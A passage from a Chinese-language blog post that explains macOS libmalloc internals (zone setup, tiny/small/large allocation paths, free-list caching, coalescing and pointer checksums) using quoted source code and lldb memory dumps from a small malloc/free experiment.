rel="external">libmalloc代码</a>。所以接下来我们就从源码的角度深入下去。</p><pre><code class="c">void *malloc(size_t size){    void *retval;    retval = malloc_zone_malloc(default_zone, size);    if (retval == NULL) {        errno = ENOMEM;    }    return retval;}</code></pre><p>这里实际调用了<code>malloc_zone_malloc</code>函数，传入了<code>default_zone</code>全局变量</p><pre><code class="c">static virtual_default_zone_t virtual_default_zone__attribute__((section(&quot;__DATA,__v_zone&quot;)))__attribute__((aligned(PAGE_MAX_SIZE))) = {    NULL,    NULL,    default_zone_size,    default_zone_malloc,    default_zone_calloc,    default_zone_valloc,    default_zone_free,    default_zone_realloc,    default_zone_destroy,    DEFAULT_MALLOC_ZONE_STRING,    default_zone_batch_malloc,    default_zone_batch_free,    &amp;default_zone_introspect,    10,    default_zone_memalign,    default_zone_free_definite_size,    default_zone_pressure_relief,    default_zone_malloc_claimed_address,};static malloc_zone_t *default_zone = &amp;virtual_default_zone.malloc_zone;</code></pre><p>这里初始化了一个默认的zone，正如名字一样<code>virtual_default_zone</code>其实是一个虚假的zone，接下来是调用<code>malloc_zone_malloc</code></p><pre><code class="c">void *malloc_zone_malloc(malloc_zone_t *zone, size_t size){    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_START, (uintptr_t)zone, size, 0, 0);    void *ptr;    if (malloc_check_start &amp;&amp; (malloc_check_counter++ &gt;= malloc_check_start)) {        internal_check();    }    if (size &gt; MALLOC_ABSOLUTE_MAX_SIZE) {        return NULL;    }    ptr = zone-&gt;malloc(zone, size);        // if lite zone is passed in then we still call the lite methods    if (malloc_logger) {        malloc_logger(MALLOC_LOG_TYPE_ALLOCATE | MALLOC_LOG_TYPE_HAS_ZONE, (uintptr_t)zone, (uintptr_t)size, 0, (uintptr_t)ptr, 0);    }    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_END, (uintptr_t)zone, size, (uintptr_t)ptr, 0);    return ptr;}</code></pre><p>这里调用的<code>ptr = zone-&gt;malloc(zone, size);</code>就是<code>default_zone_malloc</code>函数</p><pre><code class="c">static void *default_zone_malloc(malloc_zone_t *zone, size_t size){    zone = runtime_default_zone();    return zone-&gt;malloc(zone, size);}</code></pre><p>这里的<code>runtime_default_zone()</code>很重要，其实这里才是去真正的初始化zone</p><pre><code class="c">runtime_default_zone   // inline----inline_malloc_default_zone  //inline--------_malloc_initialize_once  //inline ------------_malloc_initialize()</code></pre><p>下面看<code>_malloc_initialize</code>函数，去掉了一些不相干代码</p><pre><code class="c">static void_malloc_initialize(void *context __unused){    MALLOC_LOCK();    unsigned n;    malloc_zone_t *zone = NULL;    ...    zone = create_scalable_zone(0, malloc_debug_flags);    malloc_zone_register_while_locked(zone);    malloc_set_zone_name(zone, DEFAULT_MALLOC_ZONE_STRING);        initial_default_zone = zone;    if (n != 0) { // make the default first, for efficiency        unsigned protect_size = malloc_num_zones_allocated * sizeof(malloc_zone_t *);        malloc_zone_t *hold = malloc_zones[0];        if (hold-&gt;zone_name &amp;&amp; strcmp(hold-&gt;zone_name, DEFAULT_MALLOC_ZONE_STRING) == 0) {            malloc_set_zone_name(hold, NULL);        }        mprotect(malloc_zones, protect_size, PROT_READ | PROT_WRITE);        malloc_zones[0] = malloc_zones[n];        malloc_zones[n] = hold;        mprotect(malloc_zones, protect_size, PROT_READ);    }    ...}</code></pre><p>这里主要看<code>create_scalable_zone</code>函数，所以默认的zone实际上就是scalable zone</p><pre><code class="c">malloc_zone_t *create_scalable_zone(size_t initial_size, unsigned debug_flags) {    return (malloc_zone_t *) create_scalable_szone(initial_size, debug_flags);}szone_t *create_scalable_szone(size_t initial_size, unsigned debug_flags){    szone_t *szone;    /* get memory for the zone. */    szone = mvm_allocate_pages(SZONE_PAGED_SIZE, 0, 0, VM_MEMORY_MALLOC);    if (!szone) {        return NULL;    }    ...    // Query the number of configured processors.    // Uniprocessor case gets just one tiny and one small magazine (whose index is zero). This gives    // the same behavior as the original scalable malloc. MP gets per-CPU magazines    // that scale (way) better.    unsigned int max_mags = mag_max_magazines();    uint32_t num_magazines = (max_mags &gt; 1) ? MIN(max_mags, TINY_MAX_MAGAZINES) : 1;    rack_init(&amp;szone-&gt;tiny_rack, RACK_TYPE_TINY, num_magazines, debug_flags);    rack_init(&amp;szone-&gt;small_rack, RACK_TYPE_SMALL, num_magazines, debug_flags);#if CONFIG_LARGE_CACHE    // madvise(..., MADV_REUSABLE) death-row arrivals above this threshold [~0.1%]    szone-&gt;large_entry_cache_reserve_limit = (size_t)(memsize &gt;&gt; 10);    /* &lt;rdar://problem/6610904&gt; Reset protection when returning a previous large allocation? */    int32_t libSystemVersion = NSVersionOfLinkTimeLibrary(&quot;System&quot;);    if ((-1 != libSystemVersion) &amp;&amp; ((libSystemVersion &gt;&gt; 16) &lt; 112) /* CFSystemVersionSnowLeopard */) {        szone-&gt;large_legacy_reset_mprotect = TRUE;    } else {        szone-&gt;large_legacy_reset_mprotect = FALSE;    }#endif    // Initialize the security token.    szone-&gt;cookie = (uintptr_t)malloc_entropy[0];    szone-&gt;basic_zone.version = 10;    szone-&gt;basic_zone.size = (void *)szone_size;    szone-&gt;basic_zone.malloc = (void *)szone_malloc;    szone-&gt;basic_zone.calloc = (void *)szone_calloc;    szone-&gt;basic_zone.valloc = (void *)szone_valloc;    szone-&gt;basic_zone.free = (void *)szone_free;    szone-&gt;basic_zone.realloc = (void *)szone_realloc;    szone-&gt;basic_zone.destroy = (void *)szone_destroy;    szone-&gt;basic_zone.batch_malloc = (void *)szone_batch_malloc;    szone-&gt;basic_zone.batch_free = (void *)szone_batch_free;    szone-&gt;basic_zone.introspect = (struct malloc_introspection_t *)&amp;szone_introspect;    szone-&gt;basic_zone.memalign = (void *)szone_memalign;    szone-&gt;basic_zone.free_definite_size = (void *)szone_free_definite_size;    szone-&gt;basic_zone.pressure_relief = (void *)szone_pressure_relief;    szone-&gt;basic_zone.claimed_address = (void *)szone_claimed_address;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved1 = 0;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved2 = 0;    /* Prevent overwriting the function pointers in basic_zone. */    mprotect(szone, sizeof(szone-&gt;basic_zone), PROT_READ);    szone-&gt;debug_flags = debug_flags;    _malloc_lock_init(&amp;szone-&gt;large_szone_lock);    szone-&gt;cpu_id_key = -1UL; // Unused.    CHECK(szone, __PRETTY_FUNCTION__);    return szone;}</code></pre><p>这个函数分配并且初始化了szone，设置了<code>szone_malloc</code>、<code>szone_free</code>等函数</p><p>所以后面在调用<code>malloc</code>和<code>free</code>的时候实际上调用的是<code>szone_malloc</code>、<code>szone_free</code>。<code>szone_malloc</code>的实现涉及到苹果关于堆设计中最重要的部分，这里先不展开讲解。可以看出苹果设计的这种结构很方便扩展，事实上的确如此，不仅是scalable zone，还可以注册WebKit Malloc、GFXMallocZone、QuartzCore。由对应zone的<code>malloc_zone_*</code>进行实际的内存分配工作。</p><p>下面是程序第一次调用malloc的栈帧，可以看出与我们分析的调用顺序一致</p><pre><code class="c"> *  frame #0: 0x00007fff60bd72af libsystem_malloc.dylib`create_scalable_szone    frame #1: 0x00007fff60bd6e71 libsystem_malloc.dylib`_malloc_initialize + 1482    frame #2: 0x00007fff60c0facb libsystem_platform.dylib`_os_once_callout + 18    frame #3: 0x00007fff60bd68a5 libsystem_malloc.dylib`default_zone_malloc + 77    frame #4: 0x00007fff60bd6807 libsystem_malloc.dylib`malloc_zone_malloc + 103    frame #5: 0x00007fff60bd6783 libsystem_malloc.dylib`malloc + 24    frame #6: 0x00007fff60a9831d libsystem_c.dylib`arc4_init + 109    frame #7: 0x00007fff60a98479 libsystem_c.dylib`arc4random_buf + 37    frame #8: 0x00007fff5f94644e libobjc.A.dylib`_read_images + 396    frame #9: 0x00007fff5f945473 libobjc.A.dylib`map_images_nolock + 1197    frame #10: 0x00007fff5f959279 libobjc.A.dylib`map_images + 68    ....</code></pre><h4 id="scalable-zone"><a href="#scalable-zone" class="headerlink" title="scalable zone"></a>scalable zone</h4><p>szone包含两个racks，分别是tiny和small rack</p><table><thead><tr><th>rack</th><th>32位机器</th><th>64位机器</th></tr></thead><tbody><tr><td>tiny</td><td>&lt;= 496B</td><td>&lt;= 1008B</td></tr><tr><td>small</td><td>&lt;= 128KB</td><td>&lt;=128KB</td></tr></tbody></table><p>大于127KB的就由large allocator分配，直接采用分配页大小的方式。这里不详细讨论。</p><ul><li>有几个处理器，rack就有几个magazine</li><li>每个magazine有多个regions，tiny(1MB)、small(8MB)</li><li>每个region被分为quantum，tiny(16B，64520 Q/region)、small(512B，16319 Q/region)</li></ul><p>具体可以从后面结构体中看出来其包含关系。</p><h5 id="malloc-gt-szone-malloc-gt-szone-malloc-should-clear"><a href="#malloc-gt-szone-malloc-gt-szone-malloc-should-clear" class="headerlink" title="malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear"></a>malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear</h5><pre><code class="c">MALLOC_NOINLINE void *szone_malloc_should_clear(szone_t *szone, size_t size, boolean_t cleared_requested){    void *ptr;    msize_t msize;    if (size &lt;= SMALL_THRESHOLD) {        // tiny size: &lt;=1008 bytes (64-bit), &lt;=496 bytes (32-bit)        // think tiny        msize = TINY_MSIZE_FOR_BYTES(size + TINY_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = tiny_malloc_should_clear(&amp;szone-&gt;tiny_rack, msize, cleared_requested);    } else if (size &lt;= szone-&gt;large_threshold) {        // small size: &lt;=15k (iOS), &lt;=64k (large iOS), &lt;=128k (macOS)        // think small        msize = SMALL_MSIZE_FOR_BYTES(size + SMALL_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = small_malloc_should_clear(&amp;szone-&gt;small_rack, msize, cleared_requested);    } else {        // large: all other allocations        size_t num_kernel_pages = round_page_quanta(size) &gt;&gt; vm_page_quanta_shift;        if (num_kernel_pages == 0) { /* Overflowed */            ptr = 0;        } else {            ptr = large_malloc(szone, num_kernel_pages, 0, cleared_requested);        }    }    return ptr;}</code></pre><p>上面可以清楚看出会根据其申请内存大小从tiny、small、large三种方式分配。这里以tiny为例</p><h5 id="tiny-malloc-should-clear"><a href="#tiny-malloc-should-clear" class="headerlink" title="tiny_malloc_should_clear"></a>tiny_malloc_should_clear</h5><pre><code class="c">void *tiny_malloc_should_clear(rack_t *rack, msize_t msize, boolean_t cleared_requested){    void *ptr;    mag_index_t mag_index = tiny_mag_get_thread_index() % rack-&gt;num_magazines;    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_malloc, (uintptr_t)rack, TINY_BYTES_FOR_MSIZE(msize), (uintptr_t)tiny_mag_ptr, cleared_requested);#if DEBUG_MALLOC    if (DEPOT_MAGAZINE_INDEX == mag_index) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;malloc called for magazine index -1\n&quot;);        return (NULL);    }    if (!msize) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;invariant broken (!msize) in allocation (region)\n&quot;);        return (NULL);    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    ptr = tiny_mag_ptr-&gt;mag_last_free;    if (tiny_mag_ptr-&gt;mag_last_free_msize == msize) {        // we have a winner        tiny_mag_ptr-&gt;mag_last_free = NULL;        tiny_mag_ptr-&gt;mag_last_free_msize = 0;        tiny_mag_ptr-&gt;mag_last_free_rgn = NULL;        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        CHECK(szone, __PRETTY_FUNCTION__);        if (cleared_requested) {            memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));        }#if DEBUG_MALLOC        if (LOG(szone, ptr)) {            malloc_report(ASL_LEVEL_INFO, &quot;in tiny_malloc_should_clear(), tiny cache ptr=%p, msize=%d\n&quot;, ptr, msize);        }#endif        return ptr;    }#endif /* CONFIG_TINY_CACHE */    while (1) {        ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);        if (ptr) {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            if (cleared_requested) {                memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));            }            return ptr;        }        if (tiny_get_region_from_depot(rack, tiny_mag_ptr, mag_index, msize)) {            ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);            if (ptr) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                if (cleared_requested) {                    memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));                }                return ptr;            }        }        // The magazine is exhausted. A new region (heap) must be allocated to satisfy this call to malloc().        // The allocation, an mmap() system call, will be performed outside the magazine spin locks by the first        // thread that suffers the exhaustion. That thread sets &quot;alloc_underway&quot; and enters a critical section.        // Threads arriving here later are excluded from the critical section, yield the CPU, and then retry the        // allocation. After some time the magazine is resupplied, the original thread leaves with its allocation,        // and retry-ing threads succeed in the code just above.        if (!tiny_mag_ptr-&gt;alloc_underway) {            void *fresh_region;            // time to create a new region (do this outside the magazine lock)            tiny_mag_ptr-&gt;alloc_underway = TRUE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            fresh_region = mvm_allocate_pages_securely(TINY_REGION_SIZE, TINY_BLOCKS_ALIGN, VM_MEMORY_MALLOC_TINY, rack-&gt;debug_flags);            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);            // DTrace USDT Probe            MAGMALLOC_ALLOCREGION(TINY_SZONE_FROM_RACK(rack), (int)mag_index, fresh_region, TINY_REGION_SIZE);            if (!fresh_region) { // out of memory!                tiny_mag_ptr-&gt;alloc_underway = FALSE;                OSMemoryBarrier();                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                return NULL;            }            ptr = tiny_malloc_from_region_no_lock(rack, tiny_mag_ptr, mag_index, msize, fresh_region);            // we don&#39;t clear because this freshly allocated space is pristine            tiny_mag_ptr-&gt;alloc_underway = FALSE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            return ptr;        } else {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            yield();            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);        }    }    /* NOTREACHED */}</code></pre><p>这里的<code>if (tiny_mag_ptr-&gt;mag_last_free_msize == msize)</code>是判断申请大小是否和缓存的大小相同，如果相同，则直接把该内存返回给程序。反之则从<code>ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);</code>free list中去获取刚好大于该大小的free list。这里的free list是按quantum的倍数递增的一个链表。若还是不能满足则去freelist中由合并得到的较大block中去分配。还不能满足则去region剩余部分申请。最后还不满足则申请新的一个region。申请失败则返回NULL。</p><h5 id="free-gt-malloc-zone-free-gt-szone-free"><a href="#free-gt-malloc-zone-free-gt-szone-free" class="headerlink" title="free-&gt;malloc_zone_free-&gt;szone_free"></a>free-&gt;malloc_zone_free-&gt;szone_free</h5><pre><code class="c">voidszone_free(szone_t *szone, void *ptr){    region_t tiny_region;    region_t small_region;#if DEBUG_MALLOC    if (LOG(szone, ptr)) {        malloc_report(ASL_LEVEL_INFO, &quot;in szone_free with %p\n&quot;, ptr);    }#endif    if (!ptr) {        return;    }    /*     * Try to free to a tiny region.     */    if ((uintptr_t)ptr &amp; (TINY_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed\n&quot;, ptr);        return;    }    if ((tiny_region = tiny_region_for_ptr_no_lock(&amp;szone-&gt;tiny_rack, ptr)) != NULL) {        if (TINY_INDEX_FOR_PTR(ptr) &gt;= NUM_TINY_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed\n&quot;, ptr);            return;        }        free_tiny(&amp;szone-&gt;tiny_rack, ptr, tiny_region, 0);        return;    }    /*     * Try to free to a small region.     */    if ((uintptr_t)ptr &amp; (SMALL_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed (2)\n&quot;, ptr);        return;    }    if ((small_region = small_region_for_ptr_no_lock(&amp;szone-&gt;small_rack, ptr)) != NULL) {        if (SMALL_META_INDEX_FOR_PTR(ptr) &gt;= NUM_SMALL_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed (2)\n&quot;, ptr);            return;        }        free_small(&amp;szone-&gt;small_rack, ptr, small_region, 0);        return;    }    /* check that it&#39;s a legal large allocation */    if ((uintptr_t)ptr &amp; (vm_page_quanta_size - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;non-page-aligned, non-allocated pointer %p being freed\n&quot;, ptr);        return;    }    free_large(szone, ptr);}</code></pre><p>同样，free的时候会先判断该内存是否属于tiny，small，large。则选取对应的free函数。这里以tiny为例</p><pre><code class="c">voidfree_tiny(rack_t *rack, void *ptr, region_t tiny_region, size_t known_size){    msize_t msize;    boolean_t is_free;    mag_index_t mag_index = MAGAZINE_INDEX_FOR_TINY_REGION(tiny_region);    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_free, (uintptr_t)rack, (uintptr_t)ptr, (uintptr_t)tiny_mag_ptr, known_size);    // ptr is known to be in tiny_region    if (known_size) {        msize = TINY_MSIZE_FOR_BYTES(known_size + TINY_QUANTUM - 1);    } else {        msize = get_tiny_meta_header(ptr, &amp;is_free);        if (is_free) {            free_tiny_botch(rack, ptr);            return;        }    }#if DEBUG_MALLOC    if (!msize) {        malloc_report(ASL_LEVEL_ERR, &quot;*** free_tiny() block in use is too large: %p\n&quot;, ptr);        return;    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    // Depot does not participate in CONFIG_TINY_CACHE since it can&#39;t be directly malloc()&#39;d    if (DEPOT_MAGAZINE_INDEX != mag_index) {        if (msize &lt; TINY_QUANTUM) {                      // to see if the bits fit in the last 4 bits            void *ptr2 = tiny_mag_ptr-&gt;mag_last_free; // Might be NULL            msize_t msize2 = tiny_mag_ptr-&gt;mag_last_free_msize;            region_t rgn2 = tiny_mag_ptr-&gt;mag_last_free_rgn;            /* check that we don&#39;t already have this pointer in the cache */            if (ptr == ptr2) {                free_tiny_botch(rack, ptr);                return;            }            if ((rack-&gt;debug_flags &amp; MALLOC_DO_SCRIBBLE) &amp;&amp; msize) {                memset(ptr, SCRABBLE_BYTE, TINY_BYTES_FOR_MSIZE(msize));            }            tiny_mag_ptr-&gt;mag_last_free = ptr;            tiny_mag_ptr-&gt;mag_last_free_msize = msize;            tiny_mag_ptr-&gt;mag_last_free_rgn = tiny_region;            if (!ptr2) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                return;            }            msize = msize2;            ptr = ptr2;            tiny_region = rgn2;        }    }#endif /* CONFIG_TINY_CACHE */    // Now in the time it took to acquire the lock, the region may have migrated    // from one magazine to another. I.e. trailer-&gt;mag_index is volatile.    // In which case the magazine lock we obtained (namely magazines[mag_index].mag_lock)    // is stale. If so, keep on tryin&#39; ...    region_trailer_t *trailer = REGION_TRAILER_FOR_TINY_REGION(tiny_region);    mag_index_t refreshed_index;    while (mag_index != (refreshed_index = trailer-&gt;mag_index)) { // Note assignment        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        mag_index = refreshed_index;        tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);        SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);    }    if (tiny_free_no_lock(rack, tiny_mag_ptr, mag_index, tiny_region, ptr, msize)) {        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);    }    CHECK(szone, __PRETTY_FUNCTION__);}</code></pre><p>free的时候先将该内存缓存到<code>mag_last_free</code>，若之前<code>mag_last_free</code>为NULL，那么该内存暂时不会被free，仅仅是缓存到<code>mag_last_free</code>。反之，则会将<code>mag_last_free</code>之前的内存free。在free的时候会尝试向前向后合并。合并完成后设置其前后chunk指针等metadata后将其放入对应的free list大小之中。这里需要有注意以下几点</p><ul><li>最近free的内存会被缓存，不会立即合并</li><li>在被free的块metadata是被保护的<ul><li>前后指针按16字节大小对齐</li><li>指针前4位为checksum</li></ul></li></ul><p>关于free块checksum计算如下：</p><pre><code class="c">static MALLOC_INLINE uintptr_tfree_list_checksum_ptr(rack_t *rack, void *ptr){    uintptr_t p = (uintptr_t)ptr;    return (p &gt;&gt; NYBBLE) | ((free_list_gen_checksum(p ^ rack-&gt;cookie) &amp; (uintptr_t)0xF) &lt;&lt; ANTI_NYBBLE); // compiles to rotate instruction}</code></pre><p>指针p与cookie异或然后计算checksum后左移到最高字节或上指针p右移4位得到checksumed后的指针。</p><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>代码如下</p><pre><code class="c">#include &lt;stdio.h&gt;int main(int argc, char *argv[]) {    void *p1,*p2,*p3,*p4;    p1 = malloc(24);    p2 = malloc(24);    p3 = malloc(24);    p4 = malloc(24);    memset(p1,0xaa,24);    memset(p2,0xbb,24);    memset(p3,0xcc,24);    free(p1);    free(p3);    free(p2);    free(p4);}</code></pre><p>free(p1)，直接将p1缓存，所以内存值不变</p><pre><code class="c">(lldb) x/24gx p10x1002001f0: 0xaaaaaaaaaaaaaaaa 0xaaaaaaaaaaaaaaaa0x100200200: 0xaaaaaaaaaaaaaaaa 0x00007fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p3)，p3放入缓存，p1放入大小为32字节的freelist，p1previous指针8字节设为NULL，next指针指向设为下一个free block，紧接着后面为该block大小，2*quantum=32字节</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p2)，p2放入缓存，p3放入大小为32字节的freelist，p3previous指针8字节设为NULL，next指针指向设为下一个p1</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x3000000010020023 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x200000001002001f0x100200240: 0xcccccccccccc0002 0x00020000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>free(p4)，p2向前向后合并，合并p1，p3。指向p1，大小为6*quantum=96字节。previous指针8字节设为NULL，next指针指向设为下一个大小为3Q的block</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x50000000100200480x100200200: 0xaaaaaaaaaaaa0006 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x10000000100201080x100200240: 0xcccccccccccc0002 0x00060000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>上面可以看出previous和next指针前4位都包含checksum。与上面描述的一致。</p><h4 id="libmalloc中一些结构体"><a href="#libmalloc中一些结构体" class="headerlink" title="libmalloc中一些结构体"></a>libmalloc中一些结构体</h4><h5 id="szone-s-magazine-zone-h"><a href="#szone-s-magazine-zone-h" class="headerlink" title="szone_s // magazine_zone.h"></a>szone_s // magazine_zone.h</h5><pre><code class="c">typedef struct szone_s {      // vm_allocate()&#39;d, so page-aligned to begin with.    malloc_zone_t basic_zone; // first page will be given read-only protection    uint8_t pad[PAGE_MAX_SIZE - sizeof(malloc_zone_t)];    unsigned long cpu_id_key; // unused    // remainder of structure is R/W (contains no function pointers)    unsigned debug_flags;    void *log_address;    /* Allocation racks per allocator type. */    struct rack_s tiny_rack;    struct rack_s small_rack;    /* large objects: all the rest */    _malloc_lock_s large_szone_lock MALLOC_CACHE_ALIGN; // One customer at a time for large    unsigned num_large_objects_in_use;    unsigned num_large_entries;    large_entry_t *large_entries; // hashed by location; null entries don&#39;t count    size_t num_bytes_in_large_objects;#if CONFIG_LARGE_CACHE    int large_entry_cache_oldest;    int large_entry_cache_newest;    large_entry_t large_entry_cache[LARGE_ENTRY_CACHE_SIZE]; // &quot;death row&quot; for large malloc/free    boolean_t large_legacy_reset_mprotect;    size_t large_entry_cache_reserve_bytes;    size_t large_entry_cache_reserve_limit;    size_t large_entry_cache_bytes; // total size of death row, bytes#endif    /* flag and limits pertaining to altered malloc behavior for systems with     * large amounts of physical memory */    unsigned is_largemem;    unsigned large_threshold;    unsigned vm_copy_threshold;    /* security cookie */    uintptr_t cookie;    /* The purgeable zone constructed by create_purgeable_zone() would like to hand off tiny and small     * allocations to the default scalable zone. Record the latter as the &quot;helper&quot; zone here. */    struct szone_s *helper_zone;    boolean_t flotsam_enabled;} szone_t;</code></pre><h5 id="malloc-zone-t-malloc-h"><a href="#malloc-zone-t-malloc-h" class="headerlink" title="malloc_zone_t // malloc.h"></a>malloc_zone_t // malloc.h</h5><pre><code class="c">typedef struct _malloc_zone_t {    /* Only zone implementors should depend on the layout of this structure;    Regular callers should use the access functions below */    void    *reserved1;    /* RESERVED FOR CFAllocator DO NOT USE */    void    *reserved2;    /* RESERVED FOR CFAllocator DO NOT USE */    size_t     (* MALLOC_ZONE_FN_PTR(size))(struct _malloc_zone_t *zone, const void *ptr); /* returns the size of a block or 0 if not in this zone; must be fast, especially for negative answers */    void     *(* MALLOC_ZONE_FN_PTR(malloc))(struct _malloc_zone_t *zone, size_t size);    void     *(* MALLOC_ZONE_FN_PTR(calloc))(struct _malloc_zone_t *zone, size_t num_items, size_t size); /* same as malloc, but block returned is set to zero */    void     *(* MALLOC_ZONE_FN_PTR(valloc))(struct _malloc_zone_t *zone, size_t size); /* same as malloc, but block returned is set to zero and is guaranteed to be page aligned */    void     (* MALLOC_ZONE_FN_PTR(free))(struct _malloc_zone_t *zone, void *ptr);    void     *(* MALLOC_ZONE_FN_PTR(realloc))(struct _malloc_zone_t *zone, void *ptr, size_t size);    void     (* MALLOC_ZONE_FN_PTR(destroy))(struct _malloc_zone_t *zone); /* zone is destroyed and all memory reclaimed */g    const char    *zone_name;    /* Optional batch callbacks; these may be NULL */    unsigned    (* MALLOC_ZONE_FN_PTR(batch_malloc))(struct _malloc_zone_t *zone, size_t size, void **results, unsigned num_requested); /* given a size, returns pointers capable of holding that size; returns the number of pointers allocated (maybe 0 or less than num_requested) */    void    (* MALLOC_ZONE_FN_PTR(batch_free))(struct _malloc_zone_t *zone, void **to_be_freed, unsigned num_to_be_freed); /* frees all the pointers in to_be_freed; note that to_be_freed may be overwritten during the process */    struct malloc_introspection_t    * MALLOC_INTROSPECT_TBL_PTR(introspect);    unsigned    version;    /* aligned memory allocation. The callback may be NULL. Present in version &gt;= 5. */    void *(* MALLOC_ZONE_FN_PTR(memalign))(struct _malloc_zone_t *zone, size_t alignment, size_t size);    /* free a pointer known to be in zone and known to have the given size. The callback may be NULL. Present in version &gt;= 6.*/    void (* MALLOC_ZONE_FN_PTR(free_definite_size))(struct _malloc_zone_t *zone, void *ptr, size_t size);    /* Empty out caches in the face of memory pressure. The callback may be NULL. Present in version &gt;= 8. */    size_t     (* MALLOC_ZONE_FN_PTR(pressure_relief))(struct _malloc_zone_t *zone, size_t goal);    /*     * Checks whether an address might belong to the zone. May be NULL. Present in version &gt;= 10.     * False positives are allowed (e.g. the pointer was freed, or it&#39;s in zone space that has     * not yet been allocated. False negatives are not allowed.     */    boolean_t (* MALLOC_ZONE_FN_PTR(claimed_address))(struct _malloc_zone_t *zone, void *ptr);} malloc_zone_t;</code></pre><h5 id="rack-t-magazine-rack-h"><a href="#rack-t-magazine-rack-h" class="headerlink" title="rack_t // magazine_rack.h"></a>rack_t // magazine_rack.h</h5><pre><code class="c">typedef struct rack_s {    /* Regions for tiny objects */    _malloc_lock_s region_lock MALLOC_CACHE_ALIGN;    rack_type_t type;    size_t num_regions;    size_t num_regions_dealloc;    region_hash_generation_t *region_generation;    region_hash_generation_t rg[2];    region_t initial_regions[INITIAL_NUM_REGIONS];    int num_magazines;    unsigned num_magazines_mask;    int num_magazines_mask_shift;    uint32_t debug_flags;    // array of per-processor magazines    magazine_t *magazines;    uintptr_t cookie;    uintptr_t last_madvise;} rack_t;</code></pre><h5 id="magazine-t-magazine-zone-h"><a href="#magazine-t-magazine-zone-h" class="headerlink" title="magazine_t // magazine_zone.h"></a>magazine_t // magazine_zone.h</h5><pre><code class="c">typedef struct magazine_s { // vm_allocate()&#39;d, so the array of magazines is page-aligned to begin with.    // Take magazine_lock first,  Depot lock when needed for recirc, then szone-&gt;{tiny,small}_regions_lock when needed for alloc    _malloc_lock_s magazine_lock MALLOC_CACHE_ALIGN;    // Protection for the crtical section that does allocate_pages outside the magazine_lock    volatile boolean_t alloc_underway;    // One element deep 